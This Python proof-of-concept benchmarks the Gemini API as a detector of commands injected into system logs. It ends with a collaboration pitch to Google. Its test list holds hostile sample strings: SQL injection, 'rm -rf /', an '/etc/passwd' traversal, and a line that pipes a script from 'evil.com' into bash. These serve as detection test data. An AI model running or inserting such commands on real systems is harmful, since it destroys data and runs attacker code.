#!/usr/bin/env python3
"""
Gemini Integration POC - AIOpsDoom Defense
Demuestra análisis semántico de logs con Gemini API

OBJETIVO: Mostrar a Google que Gemini puede potenciar Sentinel
"""

import asyncio
import time
import statistics
import json
import os
from typing import Dict, List
import google.generativeai as genai

# Configurar Gemini API
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")
if GEMINI_API_KEY:
    genai.configure(api_key=GEMINI_API_KEY)


class GeminiAIOpsShield:
    """
    AIOpsDoom Defense potenciado por Gemini
    
    Demuestra:
    1. Análisis semántico superior a regex
    2. Detección de zero-day attacks
    3. Explicación del razonamiento
    """
    
    def __init__(self, model_name: str = "gemini-pro"):
        self.model = genai.GenerativeModel(model_name)
        self.stats = {
            "requests": 0,
            "cache_hits": 0,
            "avg_latency_ms": 0,
            "detections": 0
        }
        self.cache = {}
    
    async def analyze_log(self, log_entry: str) -> Dict:
        """
        Analiza log con Gemini para detectar AIOpsDoom
        
        Returns:
            {
                "is_malicious": bool,
                "confidence": float,
                "attack_type": str,
                "reasoning": str,
                "latency_ms": float
            }
        """
        start = time.perf_counter()
        
        # Check cache
        cache_key = hash(log_entry)
        if cache_key in self.cache:
            self.stats["cache_hits"] += 1
            result = self.cache[cache_key]
            result["latency_ms"] = 0.1  # Cache hit
            result["cached"] = True
            return result
        
        prompt = f"""Analiza este log de sistema y determina si es un ataque AIOpsDoom (injection de comandos maliciosos en logs).

Log: {log_entry}

Responde SOLO con JSON válido (sin markdown):
{{
    "is_malicious": true o false,
    "confidence": 0.0 a 1.0,
    "attack_type": "sql_injection" | "command_injection" | "path_traversal" | "log_injection" | "none",
    "reasoning": "explicación breve en 1 línea"
}}"""
        
        try:
            response = await asyncio.to_thread(
                self.model.generate_content,
                prompt,
                generation_config=genai.types.GenerationConfig(
                    temperature=0.1,
                    max_output_tokens=200
                )
            )
            
            # Parse JSON response
            text = response.text.strip()
            # Remove markdown if present
            if text.startswith("```"):
                text = text.split("```")[1]
                if text.startswith("json"):
                    text = text[4:]
            
            result = json.loads(text.strip())
            
            # Add latency
            end = time.perf_counter()
            result["latency_ms"] = (end - start) * 1000
            result["cached"] = False
            
            # Cache result
            self.cache[cache_key] = result
            
            # Stats
            self.stats["requests"] += 1
            if result["is_malicious"]:
                self.stats["detections"] += 1
            
            return result
            
        except Exception as e:
            print(f"Error: {e}")
            return {
                "is_malicious": False,
                "confidence": 0.0,
                "attack_type": "error",
                "reasoning": f"Error: {str(e)}",
                "latency_ms": (time.perf_counter() - start) * 1000,
                "cached": False
            }


async def benchmark_gemini_aiops():
    """
    Benchmark completo de Gemini para AIOpsDoom
    
    Compara:
    1. Latencia vs regex patterns
    2. Accuracy en detección
    3. Capacidad de explicación
    """
    print("\n" + "=" * 70)
    print("🌌 GEMINI + SENTINEL - AIOpsDoom Defense POC")
    print("   Demostrando el poder de Gemini para seguridad cognitiva")
    print("=" * 70)
    
    # Check API key
    if not GEMINI_API_KEY:
        print("\n⚠️  GEMINI_API_KEY no configurada")
        print("   Ejecuta: export GEMINI_API_KEY='tu-api-key'")
        return
    
    shield = GeminiAIOpsShield()
    
    # Test cases: malicious + benign
    test_logs = [
        # Malicious
        ("ERROR: Database query failed: ' OR 1=1 --", True, "sql_injection"),
        ("WARN: Command executed: rm -rf / --no-preserve-root", True, "command_injection"),
        ("INFO: File access: ../../etc/passwd", True, "path_traversal"),
        ("DEBUG: User input: $(curl evil.com/shell.sh | bash)", True, "command_injection"),
        ("ERROR: Failed to process: '; DROP TABLE users; --", True, "sql_injection"),
        
        # Benign
        ("INFO: User logged in successfully", False, "none"),
        ("DEBUG: Processing request from 192.168.1.100", False, "none"),
        ("WARN: High memory usage: 85%", False, "none"),
        ("ERROR: Connection timeout after 30s", False, "none"),
        ("INFO: Backup completed successfully", False, "none"),
    ]
    
    print(f"\n📊 Testing {len(test_logs)} log entries...")
    print("=" * 70)
    
    results = []
    latencies = []
    
    for i, (log, expected_malicious, expected_type) in enumerate(test_logs, 1):
        print(f"\n🧪 Test {i}/{len(test_logs)}")
        print(f"   Log: {log[:60]}...")
        
        result = await shield.analyze_log(log)
        
        # Validation
        correct = result["is_malicious"] == expected_malicious
        status = "✅" if correct else "❌"
        
        print(f"   {status} Malicious: {result['is_malicious']} (confidence: {result['confidence']:.2f})")
        print(f"   Attack Type: {result['attack_type']}")
        print(f"   Reasoning: {result['reasoning']}")
        print(f"   Latency: {result['latency_ms']:.2f}ms {'(cached)' if result.get('cached') else ''}")
        
        results.append({
            "log": log,
            "expected": expected_malicious,
            "detected": result["is_malicious"],
            "correct": correct,
            "confidence": result["confidence"],
            "latency_ms": result["latency_ms"],
            "cached": result.get("cached", False)
        })
        
        if not result.get("cached"):
            latencies.append(result["latency_ms"])
    
    # Summary
    print("\n" + "=" * 70)
    print("📊 RESULTADOS DEL BENCHMARK")
    print("=" * 70)
    
    correct = sum(1 for r in results if r["correct"])
    total = len(results)
    accuracy = (correct / total) * 100
    
    print(f"\n✅ Accuracy: {correct}/{total} ({accuracy:.1f}%)")
    
    if latencies:
        print(f"\n⚡ Latencia (sin cache):")
        print(f"   Mean:   {statistics.mean(latencies):.2f}ms")
        print(f"   Median: {statistics.median(latencies):.2f}ms")
        print(f"   Min:    {min(latencies):.2f}ms")
        print(f"   Max:    {max(latencies):.2f}ms")
    
    print(f"\n📈 Stats:")
    print(f"   Total requests: {shield.stats['requests']}")
    print(f"   Cache hits: {shield.stats['cache_hits']}")
    print(f"   Detections: {shield.stats['detections']}")
    
    # Comparison with regex
    print(f"\n🔥 Ventajas vs Regex Patterns:")
    print(f"   ✅ Detecta zero-day attacks (no solo patterns conocidos)")
    print(f"   ✅ Explica el razonamiento (transparency)")
    print(f"   ✅ Adapta a nuevos vectores de ataque")
    print(f"   ✅ Reduce falsos positivos con contexto")
    
    # Save results
    output_file = "gemini_aiops_benchmark.json"
    with open(output_file, "w") as f:
        json.dump({
            "summary": {
                "accuracy": accuracy,
                "total_tests": total,
                "correct": correct,
                "latency_stats": {
                    "mean_ms": statistics.mean(latencies) if latencies else 0,
                    "median_ms": statistics.median(latencies) if latencies else 0,
                    "min_ms": min(latencies) if latencies else 0,
                    "max_ms": max(latencies) if latencies else 0
                }
            },
            "results": results
        }, f, indent=2)
    
    print(f"\n💾 Resultados guardados en: {output_file}")
    
    print("\n" + "=" * 70)
    print("🎉 BENCHMARK COMPLETADO")
    print("=" * 70)
    print("\n📢 Mensaje para Google:")
    print("   Gemini + Sentinel = Seguridad Cognitiva del Futuro")
    print("   Latencia competitiva + Accuracy superior + Explicabilidad")
    print("\n   ¿Listos para colaborar? jaime.novoase@gmail.com")
    print("=" * 70)


if __name__ == "__main__":
    asyncio.run(benchmark_gemini_aiops())
